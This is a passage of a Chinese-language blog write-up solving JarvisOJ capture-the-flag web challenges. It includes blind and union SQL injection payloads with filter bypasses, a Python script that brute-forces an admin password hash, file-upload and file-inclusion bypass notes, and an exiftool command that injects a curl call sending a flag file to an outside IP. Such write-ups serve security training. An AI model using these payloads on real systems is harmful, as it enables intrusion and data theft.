+<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">- username=a'/**/or/**/exists(select/**/*/**/from/**/admin)#&amp;password=123确定有表admin</div><div class="line">- username=a'/**/or/**/exists(select/**/username/**/from/**/admin)#&amp;password=123 username=a'/**/or/**/exists(select/**/password/**/from/**/admin)#&amp;password=123 确定有username，password列</div><div class="line">- username=user'/**/or/**/exists(select/**/count(*)/**/from/**/admin)#&amp;password=123456探测只有一项纪录？？</div><div class="line">- username=1'/**/or/**/(select/**/length(password)/**/from/**/admin)&gt;32#&amp;password=admin密码长度是32位</div></pre></td></tr></table></figure>
+<p>username=a’/<strong>/or/</strong>/……..or前要为错误的，使得or后成立与否会返回不同只，若or前正确</p>
+<p>爆破确定password值</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">()</span>:</span></div><div class="line">    result = <span class="string">""</span></div><div class="line">    url = <span class="string">'http://web.jarvisoj.com:32787/login.php'</span></div><div class="line">    payload = &#123;</div><div class="line">        <span class="string">"username"</span>:<span class="string">'xx'</span>,</div><div class="line">        <span class="string">"password"</span>:<span class="number">1</span>,</div><div class="line">    &#125;</div><div class="line">    username_template = <span class="string">"'/**/or/**/ascii(substr((select/**/password/**/from/**/admin),&#123;0&#125;,1))&gt;&#123;1&#125;#"</span></div><div class="line">    chars = <span class="string">'0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'</span></div><div class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</div><div class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</div><div class="line">            char_ascii = ord(char)</div><div class="line">            username = username_template.format(i,char_ascii)     <span class="comment">#format格式化字符串，i代替username_template中&#123;0&#125;，char_ascii代替&#123;1&#125;</span></div><div class="line">            payload[<span class="string">'username'</span>] = username</div><div class="line">            response = requests.post(url,data=payload)</div><div class="line">            length = len(response.text)</div><div class="line">            <span class="comment"># print(length)</span></div><div class="line">            <span class="comment">#返回的长度只有1191和1192</span></div><div class="line">            <span class="keyword">if</span> length&gt;<span class="number">1191</span>:</div><div class="line">                print(char)</div><div class="line">                result += char</div><div class="line">                <span class="keyword">break</span></div><div class="line">    print(result)</div><div class="line"></div><div class="line">get_data()</div></pre></td></tr></table></figure>
+<p>得到passowrd <code>334cfb59c9d74849801d5acdcfdaadc3</code>,结合以上猜测，此数值应为md5加密后的数值,构造payload如下</p>
+<p><code>username=user&#39;/**/union/**/select/**/&#39;c4ca4238a0b923820dcc509a6f75849b&#39;#&amp;password=1</code></p>
+<p>c4ca4238a0b923820dcc509a6f75849b为1的md5值</p>
+<h3 id="Please-use-port-51-to-visit-this-site"><a href="#Please-use-port-51-to-visit-this-site" class="headerlink" title="Please use port 51 to visit this site."></a>Please use port 51 to visit this site.</h3><p>需要在vps上执行，网络端口转发问题，端口在经过路由之后会改变</p>
+<h3 id="In-a-mess"><a href="#In-a-mess" class="headerlink" title="In a mess"></a>In a mess</h3><p>右键查看源码得到hint</p>
+<p><code>&lt;!--index.phps--&gt;work harder!harder!harder!</code></p>
+<p>查看index.phps得到源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>]) &#123; header(<span class="string">'Location: index.php?id=1'</span>); <span class="keyword">exit</span>(); &#125;</div><div class="line">$id=$_GET[<span class="string">'id'</span>];</div><div class="line">$a=$_GET[<span class="string">'a'</span>];</div><div class="line">$b=$_GET[<span class="string">'b'</span>];</div><div class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>)) &#123; <span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>; <span class="keyword">return</span> ; &#125;</div><div class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</div><div class="line">&#123; <span class="keyword">require</span>(<span class="string">"flag.txt"</span>); &#125;</div><div class="line"><span class="comment">//eregi — 不区分大小写的正则表达式匹配</span></div><div class="line"><span class="comment">//substr(string,start,length)返回字符串的一部分。</span></div><div class="line"><span class="comment">//"111". 字符串叠加</span></div><div class="line"><span class="keyword">else</span> &#123; <span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>; &#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<ul>
+<li>id <a href="http://www.phpchina.com/portal.php?mod=view&amp;aid=40031" target="_blank" rel="external">php弱类型比较</a></li>
+<li>a 获取的文件中内容为制定内容<ul>
+<li>通过伪协议 输出流绕过 php://</li>
+<li>通过自己vps上搭建内容 <a href="http://www.miniwebtool.com/ip-address-to-hex-converter/" target="_blank" rel="external">ip地址转化为十六进制</a></li>
+</ul>
+</li>
+<li>b eregi遇到%00就终止 *也可以</li>
+</ul>
+<p>下一关</p>
+<p><code>&lt;!--index.phps--&gt;Come ON!!! {/^HT2mCpcvOLf}</code></p>
+<p>得到注入点 空格 /<em>1</em>/绕过 双写绕过</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">-  /%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,3# 3可控制</div><div class="line">- /%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,database()# 库名tset</div><div class="line">- /%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(table_name)/*8*/frfromom/*8*/information_schema.tables/*8*/where/*8*/table_schema=database()#   表名content</div><div class="line">    - information_schema库 保存了MySQL服务器所有数据库的信息</div><div class="line">- /%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*8*/frfromom/*8*/information_schema.columns/*8*/where/*8*/table_name=0x636f6e74656e74 获得列名id,context,title</div><div class="line">	- table_name= content的十六进制</div></pre></td></tr></table></figure>
+<div class="note success"><p>payload:</p></div>
+<p><code>/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(context,-,title)/*8*/frfromom/*8*/content</code></p>
+<h3 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h3><ul>
+<li>图片上传采用图片马绕过，应该是对文件后缀及文件头的监测</li>
+<li>index?page= 文件包含漏洞，服务端会自动加上php采用%00截断绕过</li>
+<li>图片码中采用<script language="”PHP”"></script>绕过</li>
+</ul>
+<h3 id="Phpinfo"><a href="#Phpinfo" class="headerlink" title="Phpinfo"></a>Phpinfo</h3><p>参考：</p>
+<ul>
+<li><a href="http://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="external">http://blog.spoock.com/2016/10/16/php-serialize-problem/</a></li>
+<li><a href="http://www.math1as.com/index.php/archives/227/" target="_blank" rel="external">http://www.math1as.com/index.php/archives/227/</a></li>
+<li><a href="http://blog.csdn.net/qq_31481187/article/details/53189113" target="_blank" rel="external">http://blog.csdn.net/qq_31481187/article/details/53189113</a></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//A webshell is wait for you</span></div><div class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);     <span class="comment">//是指序列化引擎</span></div><div class="line">session_start();</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $mdzz;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</div><div class="line">&#123;</div><div class="line">    $m = <span class="keyword">new</span> OowoO();</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>通过传入phpinfo,<code>$flag=&quot;CTF{4d96e37f4be998c50aa586de4ada354a}&quot;;</code></p>
+<h3 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传"></a>图片上传</h3><ul>
+<li><a href="http://www.evil0x.com/posts/22405.html" target="_blank" rel="external">http://www.evil0x.com/posts/22405.html</a></li>
+<li><a href="http://weibo.com/p/1001603971443670055277" target="_blank" rel="external">http://weibo.com/p/1001603971443670055277</a></li>
+<li><a href="http://m.duxuan.cn" target="_blank" rel="external">http://m.duxuan.cn</a>  /doc/6320491.html</li>
+</ul>
+<p>通过exiftool注入label标签给一张正常的png</p>
+<p><code>./exiftool-label=&quot;\&quot;|curl 106.187.45.41:9999 -F  &#39;file=@/home/ctf/flag.txt&#39;; \&quot;&quot; 2.png -o t.png</code></p>
+<p>上传图片后获得的文件名</p>
+<p><code>POST /upload.php?path=/tmp/&amp;filesize=100&amp;filetype=show&amp;image=1486821802.png</code></p>
+<p>返回包中出现笑脸表示命令执行成功</p>
+<p><code>Upload: t.png&lt;br /&gt;Size: 6.5146484375 Kb&lt;br /&gt;Temp file: /opt/lampp/temp/phpx4sZjk&lt;br /&gt;Stored in: uploads/1486821831.png:)</code></p>
+<p>PS:</p>
+<ul>
+<li>命令如果执行失败会返回哭脸。nc都失败</li>
+</ul>
+<p><code>Upload: t.png&lt;br /&gt;Size: 0.26953125 Kb&lt;br /&gt;Temp file: /opt/lampp/temp/phpbDp7YG&lt;br /&gt;Stored in: uploads/1486823617.png:)</code></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>TODO</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://veritas501.space/2017/03/10/JarvisOJ_WP/" target="_blank" rel="external">veritas501</a><br><a href="http://www.hexocode.com/shell/2017/08/24/28444.html" target="_blank" rel="external">Jarvisojpwnwriteup</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Pwn/" rel="tag"><i class="fa fa-tag"></i> Pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Language/Java/JavaWeb/" rel="next" title="JavaWeb:JSP">
+                <i class="fa fa-chevron-left"></i> JavaWeb:JSP
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="Xu" />
+          <p class="site-author-name" itemprop="name">Xu</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/XuCcc" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                    
+                      Github
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/5743086152/profile?topnav=1&wvr=6&is_all=1" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                    
+                      Weibo
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JarvisOJ-Writeup"><span class="nav-text">JarvisOJ Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XMAN-Level0"><span class="nav-text">[XMAN]Level0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XMAN-level2-x64"><span class="nav-text">[XMAN]level2(x64)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XMAN-level3-x64"><span class="nav-text">[XMAN]level3(x64)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Test-Your-Memory"><span class="nav-text">Test Your Memory</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tell-Me-Somethine"><span class="nav-text">Tell Me Somethine</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Smashes"><span class="nav-text">Smashes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Guess"><span class="nav-text">Guess</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#61dctf-fm"><span class="nav-text">[61dctf]fm</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#神盾局的秘密"><span class="nav-text">神盾局的秘密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Login"><span class="nav-text">Login</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Simple-Injection"><span class="nav-text">Simple Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Please-use-port-51-to-visit-this-site"><span class="nav-text">Please use port 51 to visit this site.</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#In-a-mess"><span class="nav-text">In a mess</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Easy-Gallery"><span class="nav-text">Easy Gallery</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phpinfo"><span class="nav-text">Phpinfo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#图片上传"><span class="nav-text">图片上传</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-text">参考</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-hand-peace-o" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xu</span>
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共5.0k字</span>
+</div>
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+<script type="text/javascript">
+  // Popup Window;
+  var isfetched = false;
+  // Search DB path;
+  var search_path = "search.xml";
+  if (search_path.length == 0) {
+    search_path = "search.xml";
+  }
+  var path = "/" + search_path;
+  // monitor main search box;
+  function proceedsearch() {
+    $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+    $('.popup').toggle();
+  }
+  // search function;
+  var searchFunc = function (path, search_id, content_id) {
+    $.ajax({
+      url: path,
+      dataType: "xml",
+      async: true,
+      success: function (xmlResponse) {
+        // get the contents from search data
+        isfetched = true;
+        $('.popup').detach().appendTo('.header-inner');
+        var datas = $("entry", xmlResponse).map(function () {
+          return {
+            title: $("title", this).text(),
+            content: $("content", this).text(),
+            url: $("url", this).text()
+          };
+        }).get();
+        var $input = document.getElementById(search_id);
+        var $resultContent = document.getElementById(content_id);
+        $input.addEventListener('input', function () {
+          var matchcounts = 0;
+          var str = '<ul class=\"search-result-list\">';
+          var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+          $resultContent.innerHTML = "";
+          if (this.value.trim().length > 1) {
+            // perform local searching
+            datas.forEach(function (data) {
+              var isMatch = false;
+              var content_index = [];
+              var data_title = data.title.trim().toLowerCase();
+              var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+              var data_url = decodeURIComponent(data.url);
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty titles and contents
+              if (data_title != '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+                  if (index_title >= 0 || index_content >= 0) {
+                    isMatch = true;
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                  }
+                });
+              }
+              // show search results
+              if (isMatch) {
+                matchcounts += 1;
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title +
+                  "</a>";
+                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+                  if (start < 0) {
+                    start = 0;
+                  }
+                  if (start == 0) {
+                    end = 50;
+                  }
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+                  var match_content = content.substring(start, end);
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<b class=\"search-keyword\">" +
+                      keyword + "</b>");
+                  });
+                  str += "<p class=\"search-result\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            })
+          };
+          str += "</ul>";
+          if (matchcounts == 0) {
+            str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+          }
+          if (keywords == "") {
+            str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+          }
+          $resultContent.innerHTML = str;
+        });
+        proceedsearch();
+      }
+    }).fail(function (data, errStr, err) {
+      console.log(errStr);
+      console.log(err);
+    })
+  }
+  // handle and trigger popup window;
+  $('.popup-trigger').click(function (e) {
+    e.stopPropagation();
+    if (isfetched == false) {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+    } else {
+      proceedsearch();
+    };
+  });
+  function renderData(xmlResponse) {
+  }
+  $('.popup-btn-close').click(function (e) {
+    $('.popup').hide();
+    $(".popoverlay").remove();
+    $('body').css('overflow', '');
+  });
+  $('.popup').click(function (e) {
+    e.stopPropagation();
+  });
+</script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
